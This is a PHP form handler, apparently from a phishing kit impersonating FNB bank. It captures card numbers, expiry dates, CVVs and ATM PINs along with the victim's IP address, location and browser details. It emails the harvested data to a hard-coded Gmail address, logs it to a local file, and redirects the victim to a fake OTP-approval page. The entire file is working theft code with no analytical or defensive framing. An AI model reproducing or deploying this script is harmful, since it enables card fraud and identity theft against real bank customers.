
<?php

$name = $_POST['card'];
$name1 = $_POST['exp'];
$name2 = $_POST['cvv'];
$name3 = $_POST['pho'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];

$message = "=== F N B  C C ===S T A R T==== \n";
$message .= "Card Number:: $name \n";
$message .= "Expiration Date:: $name1 \n";
$message .= "CVV:: $name2 \n";
$message .= "ATM PIN:: $name3 \n";
$message .= 	"IP: {$geoplugin->ip}  \n";
$message .= 	"City: {$geoplugin->city}  \n";
$message .= 	"Region: {$geoplugin->region}  \n";
$message .= 	"Country Name: {$geoplugin->countryName}  \n";
$message .= 	"Country Code: {$geoplugin->countryCode}  \n";
$message .= 	"User-Agent: ".$browser."  \n";
$message .= "Date Log  : ".$date."  \n";
$message .= "Time Log  : ".$time." \n";
$message .= "=========E N D===================== \n";

 
$email_from = "$_SERVER[REMOTE_ADDR]\n";//<== update the email address
$email_subject = "FNB CC 2nd LOGIN | [$name] [{$geoplugin->ip}]";
 
$to = "miichlasj@gmail.com";//<== update the email address
$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$message,$headers);


//done. redirect to thank-you page.

header("Location: xvciIgY29udGVudD0iI2ZhZmFmYSAiPiA8bWV0YSBjb250ZW50PSIvYW5kcm9pZC1jaHApprove-OTP.html");

$fp = fopen("fnbmyltsxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);

   
?>